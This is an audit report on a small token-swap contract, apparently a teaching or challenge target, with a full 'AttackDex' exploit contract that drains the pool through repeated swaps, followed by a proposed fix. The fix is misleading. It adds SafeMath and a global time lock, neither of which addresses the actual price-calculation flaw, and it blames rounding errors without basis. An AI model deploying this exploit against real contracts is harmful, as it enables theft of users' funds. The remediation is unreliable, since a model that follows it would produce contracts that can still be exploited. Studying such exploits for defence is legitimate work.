## Dex Smart Contract Audit Report

### Project Overview

This report provides an audit of the `Dex` and `SwappableToken` smart contracts. The audit identifies potential vulnerabilities, outlines attack paths, provides proof of code, assesses the impact, and gives recommendations for improvements.

### Contracts Audited

1. `Dex`
2. `SwappableToken`
3. `AttackDex` (for exploiting the identified vulnerability)

### Summary of Findings

- **Vulnerability**: Price Manipulation via Integer Arithmetic in the Swap Function.
- **Impact**: High - Allows an attacker to drain all tokens from the Dex.
- **Likelihood**: High - The vulnerability is easily exploitable with simple arithmetic operations.
- **Recommendation**: Implement safeguards against price manipulation and correct the arithmetic operations to prevent exploits.

### Vulnerability Details

#### 1. Price Manipulation via Integer Arithmetic

**Description**:
The `Dex` contract uses integer arithmetic to calculate the swap price, leading to potential rounding errors. This allows an attacker to manipulate the token prices by repeatedly swapping tokens back and forth, thereby exponentially increasing their balance and ultimately draining the Dex.

**Proof of Code**:
```solidity
function swap(address from, address to, uint256 amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}

function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

**Attack Path**:
1. An attacker starts with 10 tokens of `token1` and `token2`.
2. Repeatedly swaps `token1` to `token2` and vice versa to manipulate the prices.
3. Each swap operation results in an exponential increase in the attacker’s token balance due to rounding errors.
4. Eventually, the attacker drains all tokens from the Dex.

**Exploit Code**:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IDex {
    function swap(address, address, uint256) external;
    function getSwapPrice(address, address, uint256) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract AttackDex {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function hack() external {
        // Sending our tokens to this contract
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // Approve the max amount of tokens
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // Price manipulation time
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);

        // At this point, according to our math, we only need to swap 45 tokens to drain all of token1
        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "Price manipulation attack failed");
    }
}
```

### Impact

The identified vulnerability allows an attacker to drain all tokens from the Dex contract, resulting in a complete loss of funds. The impact is severe and high, as it compromises the entire liquidity pool, leading to potential financial losses for all users interacting with the Dex.

### Recommendations

1. **Prevent Price Manipulation**:
   - Implement safeguards to prevent price manipulation through repeated swapping.
   - Introduce a minimum time interval between swaps to reduce the potential for exploitation.

2. **Use Safe Arithmetic**:
   - Use a library like OpenZeppelin's `SafeMath` to handle arithmetic operations and prevent overflow/underflow errors.
   - Ensure that the division operation accounts for rounding errors and adjusts the swap amounts accordingly.


 - First, we'll use OpenZeppelin's `SafeMath` library to handle arithmetic operations safely. Additionally, we'll implement a time lock mechanism to prevent rapid repeated swaps.

### Dex Contract with SafeMath and Time Lock

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Dex {
    using SafeMath for uint256;

    address public token1;
    address public token2;
    uint256 public lastSwapTime;
    uint256 public swapInterval = 1 minutes;

    constructor(address _token1, address _token2) {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        require(block.timestamp >= lastSwapTime + swapInterval, "Swapping too frequently");

        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).transfer(msg.sender, swapAmount);

        lastSwapTime = block.timestamp;
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        uint256 fromBalance = IERC20(from).balanceOf(address(this));
        uint256 toBalance = IERC20(to).balanceOf(address(this));
        require(fromBalance > 0 && toBalance > 0, "Insufficient liquidity");

        // Using SafeMath for division
        uint256 swapPrice = amount.mul(toBalance).div(fromBalance);
        return swapPrice;
    }
}
```

### Key Changes:

1. **SafeMath**:
   - We import and use OpenZeppelin's `SafeMath` for safe arithmetic operations.

2. **Time Lock**:
   - We introduce a `lastSwapTime` variable to track the last time a swap was performed.
   - We introduce a `swapInterval` variable to set a minimum time interval between swaps (e.g., 1 minute).
   - We check that the current timestamp is greater than or equal to `lastSwapTime + swapInterval` before allowing a swap to proceed.

3. **Simplified Swap Function**:
   - The `swap` function now directly transfers the `swapAmount` from the contract to the user without the need for `approve`.

### Notes:
- This implementation prevents rapid repeated swaps, reducing the risk of price manipulation.
- Ensure that the `swapInterval` is set to an appropriate value to balance security and usability.
- Further improvements could include more sophisticated price manipulation safeguards, such as dynamic price adjustments based on recent trading activity.

